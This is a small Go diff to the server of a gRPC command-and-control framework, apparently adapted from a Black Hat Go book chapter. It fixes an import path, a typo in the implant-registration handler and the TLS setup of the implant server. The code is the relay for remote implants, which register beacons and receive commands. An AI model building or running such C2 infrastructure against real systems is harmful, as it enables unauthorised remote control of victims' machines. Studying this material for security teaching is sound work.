@@ -9,7 +9,7 @@ import (
 	"log"
 	"errors"
 	"net"
-	"github.com/matt-culbert/Switchblade/grpcapi"
+	"github.com/matt-culbert/bhg/ch-14/grpcapi"
 	"google.golang.org/grpc"
 	"google.golang.org/grpc/credentials"
 
@@ -65,7 +65,7 @@ func (s *adminServer) RunCommand(ctx context.Context, cmd *grpcapi.Command) (*gr
 	return res, nil
 }
 
-func (s *implantServer) RegisterImplant(ctx context.Context, whoami *grcpapi.Command) (*grpcapi.Empty, error) {
+func (s *implantServer) RegisterImplant(ctx context.Context, whoami *grpcapi.Command) (*grpcapi.Empty, error) {
 	log.Printf("New beacon: %c", whoami)
 	return &grpcapi.Empty{},nil
 }
@@ -110,9 +110,9 @@ func main() {
                 log.Fatal(err)
         }
 
-        serverOption := []grpc.ServerOption{grpc.Creds(credentials.NewTLS(tlsConfig))}
+        //serverOption := []grpc.ServerOption{grpc.Creds(credentials.NewTLS(tlsConfig))}
 
-        grpcImplantServer := grpc.NewServer(serverOption)
+        grpcImplantServer := grpc.NewServer(grpc.Creds(credentials.NewTLS(tlsConfig)))
         grpcAdminServer := grpc.NewServer(opts...)
         grpcapi.RegisterImplantServer(grpcImplantServer, implant)
         grpcapi.RegisterAdminServer(grpcAdminServer, admin)
